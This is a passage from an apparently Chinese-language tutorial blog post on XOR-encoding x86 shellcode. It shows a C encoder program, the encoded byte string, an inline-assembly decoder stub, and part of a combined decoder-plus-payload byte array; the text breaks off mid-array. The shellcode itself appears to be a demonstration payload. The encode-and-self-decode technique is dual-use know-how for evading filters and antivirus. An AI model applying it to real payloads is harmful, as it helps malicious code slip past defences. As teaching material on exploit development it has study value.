class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token number">0x90</span> </pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">void</span> <span class="token function">encoder</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> input<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">,</span> <span class="token keyword">int</span> display_flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	FILE <span class="token operator">*</span> fp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span> output<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	output<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>output<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"memory erro!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>	<span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>		output<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"encode.txt"</span><span class="token punctuation">,</span><span class="token string">"w+"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"output file create erro"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>	<span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>	<span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>	<span class="token punctuation">&#123;</span>		</pre></td></tr><tr><td data-num="56"></td><td><pre>		<span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"\\x%0.2x"</span><span class="token punctuation">,</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>		<span class="token punctuation">&#123;</span>			</pre></td></tr><tr><td data-num="59"></td><td><pre>			<span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"\"\n\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>	<span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>	<span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"dump the encoded shellcode to encode.txt OK!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span>display_flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>		<span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%0.2x "</span><span class="token punctuation">,</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>	<span class="token function">free</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="77"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>	<span class="token function">encoder</span><span class="token punctuation">(</span>hexData<span class="token punctuation">,</span><span class="token number">0x44</span> <span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>	<span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>测试运行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410201245896.png" alt="image-20220410201245896" /></p>
<p>txt 文件</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token string">"\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48"</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token string">"\xcf\xb0\xc9\x3a\xb0\x77\x9f\xf3\x40\x6f\xa7\x22\xff\x77\x76\x17"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token string">"\x2c\x31\x37\x21\x36\x10\x77\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf"</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token string">"\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1"</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token string">"\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x47\x89\xcf\x1d"</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token string">"\x64\x47\x99\x77\xbb\x03\xcf\x70\xff\x47\xb1\xdd\x4b\xfa\x42\x7e"</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token string">"\x80\x30\x4c\x85\x8e\x43\x47\x94\x02\xaf\xb5\x7f\x10\x60\x58\x31"</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token string">"\xa0\xcf\x1d\x60\x47\x99\x22\xcf\x78\x3f\xcf\x1d\x58\x47\x99\x47"</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token string">"\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x77\x9f"</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token string">"\x17\x2c\x22\x22\x22\x22\x2c\x22\x22\x22\x22\xcf\x80\x17\x14\x14"</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token string">"\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4"</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410201325299.png" alt="image-20220410201325299" /></p>
<h3 id="decode"><a class="anchor" href="#decode">#</a> decode</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	__asm <span class="token keyword">int</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	__asm</pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>			nop</pre></td></tr><tr><td data-num="7"></td><td><pre>			nop</pre></td></tr><tr><td data-num="8"></td><td><pre>			nop</pre></td></tr><tr><td data-num="9"></td><td><pre>			nop</pre></td></tr><tr><td data-num="10"></td><td><pre>			nop</pre></td></tr><tr><td data-num="11"></td><td><pre>			nop</pre></td></tr><tr><td data-num="12"></td><td><pre>			pop eax</pre></td></tr><tr><td data-num="13"></td><td><pre>			add eax<span class="token punctuation">,</span> <span class="token number">0x14</span></pre></td></tr><tr><td data-num="14"></td><td><pre>			xor ecx<span class="token punctuation">,</span>ecx</pre></td></tr><tr><td data-num="15"></td><td><pre>decode_loop<span class="token operator">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>			mov bl<span class="token punctuation">,</span><span class="token punctuation">[</span>eax<span class="token operator">+</span>ecx<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre>			xor bl<span class="token punctuation">,</span> <span class="token number">0x44</span></pre></td></tr><tr><td data-num="18"></td><td><pre>			mov <span class="token punctuation">[</span>eax<span class="token operator">+</span>ecx<span class="token punctuation">]</span><span class="token punctuation">,</span>bl</pre></td></tr><tr><td data-num="19"></td><td><pre>			</pre></td></tr><tr><td data-num="20"></td><td><pre>			inc ecx</pre></td></tr><tr><td data-num="21"></td><td><pre>			cmp bl<span class="token punctuation">,</span><span class="token number">0x90</span></pre></td></tr><tr><td data-num="22"></td><td><pre>			jne decode_loop</pre></td></tr><tr><td data-num="23"></td><td><pre>			nop</pre></td></tr><tr><td data-num="24"></td><td><pre>			nop</pre></td></tr><tr><td data-num="25"></td><td><pre>			nop</pre></td></tr><tr><td data-num="26"></td><td><pre>			nop</pre></td></tr><tr><td data-num="27"></td><td><pre>			nop</pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>编译测试源码，在 OD 中打开生成的 exe 文件</p>
<p>进入关键函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410201702248.png" alt="image-20220410201702248" /></p>
<p>二进制复制</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">83</span> C0 <span class="token number">14</span> <span class="token number">33</span> C9 <span class="token number">8</span>A <span class="token number">1</span>C <span class="token number">08</span> <span class="token number">80</span> F3 <span class="token number">44</span> <span class="token number">88</span> <span class="token number">1</span>C <span class="token number">08</span> <span class="token number">41</span> <span class="token number">80</span> FB <span class="token number">90</span> <span class="token number">75</span> F1</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410201728656.png" alt="image-20220410201728656" /></p>
<p>将复制出来的解码器和密文一同粘贴到 010 中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220410202025883.png" alt="image-20220410202025883" /></p>
<p>复制为 C 代码</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">unsigned</span> <span class="token keyword">char</span> hexData<span class="token punctuation">[</span><span class="token number">189</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token 